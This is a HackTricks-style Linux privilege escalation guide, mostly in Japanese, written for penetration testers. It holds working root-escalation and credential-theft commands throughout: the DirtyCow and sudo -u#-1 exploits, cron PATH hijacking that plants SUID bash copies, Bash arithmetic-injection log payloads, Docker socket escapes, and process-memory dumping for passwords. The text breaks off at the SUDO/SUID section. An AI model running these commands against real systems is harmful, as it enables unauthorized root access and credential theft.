# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中の OS に関する情報収集を始めましょう
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

もし **`PATH` 変数内の任意のフォルダに書き込み権限がある場合**、いくつかのライブラリやバイナリをハイジャックできる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワードやAPIキーはありませんか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version を確認して、escalate privileges に使える exploit があるか調べる
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
脆弱なカーネルの良い一覧と、既に**compiled exploits**がいくつか次で見つけられます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) と [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
その他**compiled exploits**を見つけられるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブサイトから脆弱なカーネルのバージョンをすべて抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits を検索するのに役立つツールは:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

必ず **search the kernel version in Google**。場合によっては、あなたの kernel version が既知の kernel exploit に記載されており、その exploit が有効であることを確認できます。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo のバージョン

以下に示されている脆弱な sudo バージョンに基づいて:
```bash
searchsploit sudo
```
この grep を使って sudo のバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

出典: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg シグネチャ検証に失敗しました

この vuln がどのように悪用されるかの **例** は、**smasher2 box of HTB** を参照してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらにシステムの列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御策を列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

docker container の中にいる場合、そこから脱出を試みることができます:

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

どこで、なぜ **what is mounted and unmounted** かを確認してください。もし何かが unmounted であれば、それを mount して機密情報がないか確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**any compiler is installed**かどうか確認してください。これは、何らかの kernel exploit を使う必要がある場合に役立ちます。なぜなら、それを使用するマシン（または同等のマシン）上で compile することが推奨されるからです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

インストールされているパッケージやサービスの**バージョン**を確認してください。もしかすると、古いNagiosのバージョン（例えば）が存在し、それが could be exploited for escalating privileges…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンにSSHアクセスがある場合、内部にインストールされている古いまたは脆弱なソフトウェアをチェックするために **openVAS** を使用することもできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示し、そのほとんどは無駄になる可能性があるため、OpenVAS のようなアプリケーション（または同等のもの）を使用して、インストールされているソフトウェアのバージョンが既知の exploits に対して脆弱かどうかを確認することを推奨します_

## プロセス

実行中の**どのプロセス**を確認し、プロセスが本来持つべきでないほど**多くの権限**を持っていないか確認してください（例えば tomcat が root によって実行されているなど）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDに対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマップされているかを示し**、また各マップ領域の**アクセス許可**も表示します。  
**mem** 疑似ファイルは**プロセスのメモリそのものを公開します**。  
**maps** ファイルから、どの**メモリ領域が読み取り可能か**とそのオフセットがわかります。  
この情報を使って、**mem ファイル内をシークして読み取り可能な全ての領域をダンプ**し、ファイルに保存します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの **物理** メモリにアクセスするためのデバイスであり、仮想メモリへはアクセスしません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDumpは、Windows向けのSysinternalsスイートにある古典的なProcDumpツールをLinux向けに再構想したものです。入手先: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次のツールが使えます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でrootの要件を取り除き、自分が所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要です)

### プロセスのメモリからの資格情報

#### 手動の例

authenticator プロセスが実行中であることが分かったら:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをdumpして（前のセクションを参照して、プロセスのmemoryをdumpするさまざまな方法を確認してください）memory内でcredentialsを検索できます：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の認証情報を取得**し、いくつかの**よく知られたファイル**からも取得します。正常に動作させるにはroot権限が必要です。

| 機能                                              | プロセス名             |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュールされた/Cron ジョブ

スケジュールされたジョブに脆弱性がないか確認する。rootによって実行されるスクリプトを利用できるかもしれない（wildcard vuln? rootが使うファイルを変更できるか? symlinksを使う? rootが使うディレクトリに特定のファイルを作成する?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron パス

例えば、_/etc/crontab_ の中で次のような PATH を見つけることができます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（注意: ユーザー "user" が /home/user に書き込み権限を持っている点に注目）

もしこの crontab の中で root ユーザーが PATH を設定せずにコマンドやスクリプトを実行しようとすると。例えば: _\* \* \* \* root overwrite.sh_\
すると、次のようにして root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、これを利用して予期しない動作（例えば privesc）を引き起こすことができます。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードが次のようなパスの前にある場合** _**/some/path/\***_ **、脆弱ではありません（_**./\***_ も同様です）。**

次のページを参照すると、ワイルドカードの悪用トリックについてさらに学べます:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash の cron ログパーサにおける算術展開注入

Bash は ((...))、$((...)) および let の中で算術評価を行う前に parameter expansion と command substitution を実行します。もし root が実行する cron/パーサが信頼できないログフィールドを読み取り、それを算術コンテキストに渡すと、攻撃者はコマンド置換 $(...) を注入でき、cron 実行時に root としてコマンドが実行されます。

- なぜ動くか: Bash では展開は次の順序で行われます: パラメータ/変数展開、コマンド置換、算術展開、その後に単語分割とパス名展開。したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず置換（コマンド実行）され、残った数値の `0` が算術に使われるためスクリプトはエラーなく続行します。

- 典型的な脆弱パターン:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 悪用: パースされるログに攻撃者制御のテキストを書き込み、数値に見えるフィールドがコマンド置換を含み末尾が数字になるようにします。コマンドが stdout に出力しない（またはリダイレクトする）ようにして、算術評価が有効なままであることを確認してください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root によって実行される script が **あなたが完全にアクセスできる directory** を使用している場合、その folder を削除して、あなたが制御する script を提供する **別のものへの symlink folder を作成する** と有効かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁な cron jobs

1分、2分、5分ごとに実行されているプロセスを探すためにプロセスを監視できます。場合によってはそれを利用して escalate privileges できるかもしれません。

例えば、**1分間、0.1秒ごとに監視**し、**実行頻度の少ないコマンドでソート**し、最も多く実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（これにより開始されるすべてのプロセスが監視され一覧表示されます）。

### 見えない cron jobs

コメントの後に**キャリッジリターンを入れる**（改行文字を含めず）ことで cronjob を作成でき、cron job は動作します。例（キャリッジリターン文字に注意）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

書き込み可能な `.service` ファイルがあるか確認してください。もし書き込めるなら、それを変更してサービスが開始、再起動、停止されたときにあなたの backdoor を実行させることができます（マシンの再起動を待つ必要があるかもしれません）。\
例えば .service ファイル内に backdoor を作り、**`ExecStart=/tmp/script.sh`** のようにします。

### 書き込み可能な service バイナリ

覚えておいてください、**サービスによって実行されるバイナリに対する書き込み権限** を持っている場合、それらを backdoors に差し替えることができ、サービスが再実行されると backdoors が実行されます。

### systemd PATH - 相対パス

**systemd** が使用する PATH は次のコマンドで確認できます:
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**書き込み**ができることを確認した場合、**escalate privileges**できる可能性があります。サービスの設定ファイルで**相対パスが使用されている**箇所を探す必要があります。例えば:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
それから、書き込み可能な systemd の PATH フォルダ内に、相対パスのバイナリと同じ名前の **executable** を作成します。サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されると、あなたの **backdoor** が実行されます（特権のないユーザーは通常サービスの start/stop を実行できませんが、`sudo -l` が使えるか確認してください）。

**サービスについては `man systemd.service` を参照してください。**

## **Timers**

**Timers** は名前が `**.timer**` で終わる systemd の unit ファイルで、`**.service**` ファイルやイベントを制御します。**Timers** はカレンダー時間イベントや単調時間イベントをネイティブにサポートしており、非同期で実行できるため、cron の代替として利用できます。

すべてのタイマーは次のコマンドで列挙できます：
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

もしタイマーを変更できれば、systemd.unit の既存のユニット（例えば `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> このタイマーが満了したときに起動されるユニット。引数はサフィックスが ".timer" ではないユニット名です。指定しない場合、この値はタイマーユニットと同じ名前（サフィックスを除く）を持つ service にデフォルトされます（上記参照）。起動されるユニット名とタイマーユニットのユニット名は、サフィックスを除いて同一にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- 書き込み可能なバイナリを**実行している** systemd ユニット（例: `.service`）を見つける
- **相対パスを実行している** systemd ユニットを見つけ、かつその実行ファイルを偽装するために **systemd PATH** に対して**書き込み権限**を持っている（その実行ファイルを偽装するため）

**Learn more about timers with `man systemd.timer`.**

### **タイマーの有効化**

タイマーを有効化するには root 権限が必要で、次を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

一部には **sockets listening for HTTP** requests が存在する場合があることに注意してください（_ここで言っているのは .socket files ではなく unix sockets として動作しているファイルのことです_）。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **responds with an HTTP** request, then you can **communicate** with it and maybe **exploit some vulnerability**.

### 書き込み可能な Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドは、ホストのファイルシステムに対して root 権限でアクセスできるコンテナを実行することを可能にします。

#### **Docker API を直接使用する**

Docker CLI が利用できない場合でも、Docker API と `curl` コマンドを使用して Docker ソケットを操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

新しく作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使用してコンテナへの接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

socat 接続を設定した後、コンテナ内でホストのファイルシステムに対する root 権限で直接コマンドを実行できます。

### その他

注意: docker ソケットに対して書き込み権限を持っている（**inside the group `docker`** のメンバーである）場合、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) が利用可能です。さらに、[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) の場合は、それを悪用して侵害できる可能性もあります。

以下で、docker からの脱出や特権昇格のための悪用方法の詳細を確認してください:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

もし **`ctr`** コマンドを使用できる場合は、次のページを参照してください — **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

もし **`runc`** コマンドを使用できる場合は、次のページを参照してください — **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度な **インター・プロセス通信（IPC）システム** であり、アプリケーションが効率的に相互作用してデータを共有できるようにします。モダンな Linux システムを念頭に設計されており、さまざまな形態のアプリケーション間通信に対して堅牢なフレームワークを提供します。

このシステムは多用途であり、プロセス間のデータ交換を強化する基本的な IPC をサポートし、**enhanced UNIX domain sockets** を想起させます。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間のシームレスな統合を促進します。例えば、着信通話に関する Bluetooth デーモンからのシグナルが音楽プレーヤーにミュートを促すことでユーザー体験が向上する、といったことが可能です。加えて、D-Bus はリモートオブジェクトシステムをサポートしており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑であったプロセスを効率化します。

D-Bus は **allow/deny model** に基づいて動作しており、ポリシー規則の照合結果の累積効果に基づいてメッセージの許可（メソッド呼び出し、シグナルの送出など）を管理します。これらのポリシーはバスとのインタラクションを定義しており、これらの権限を悪用することで privilege escalation が発生する可能性があります。

そのようなポリシーの例が `/etc/dbus-1/system.d/wpa_supplicant.conf` に示されており、root ユーザーが `fi.w1.wpa_supplicant1` を所有し、送信し、受信する権限が詳細に記述されています。

ユーザーやグループが指定されていないポリシーは普遍的に適用され、一方で "default" コンテキストのポリシーは他の特定のポリシーでカバーされないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus communication を enumerate して exploit する方法を学べます:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークをenumerateしてマシンの位置を特定するのは常に興味深い。

### 一般的な enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 開いているポート

アクセスする前に確認できなかったマシン上で動作しているネットワークサービスは必ず確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic ができるか確認してください。できれば、いくつかの credentials を入手できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**誰**であるか、どの**権限**を持っているか、システム内にどの**ユーザー**がいるか、どのユーザーが**login**できるか、そしてどのユーザーが**root privileges**を持っているかを確認してください：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大きな UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限を昇格できるバグの影響を受けていました。詳細情報: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) および [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**悪用するには:** **`systemd-run -t /bin/bash`**

### グループ

root 権限を付与する可能性のある**グループのメンバー**でないか確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であれば、クリップボード内に興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**任意のパスワードを知っている場合は**、そのパスワードを使って**各ユーザーにログインしてみてください**。

### Su Brute

大量のノイズを出しても構わない場合、かつ`su`や`timeout`バイナリがコンピュータに存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)を使ってユーザーを総当たりすることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)は`-a`パラメータでユーザーの総当たりも試みます。

## 書き込み可能な $PATH の悪用

### $PATH

$PATH の任意のフォルダに**書き込みできることが分かった場合**、書き込み可能なフォルダ内に別ユーザー（理想的には root）が実行するであろうコマンド名で**backdoor を作成することで権限を昇格できる可能性があります**。ただし、そのコマンドが$PATH中で**あなたの書き込み可能フォルダより前に位置するフォルダから読み込まれない**ことが条件です。

### SUDO and SUID

sudo を使っていくつかのコマンドを実行できる権限があるか、またはファイルに suid ビットが設定されている可能性があります。次のコマンドで確認してください：
```bash
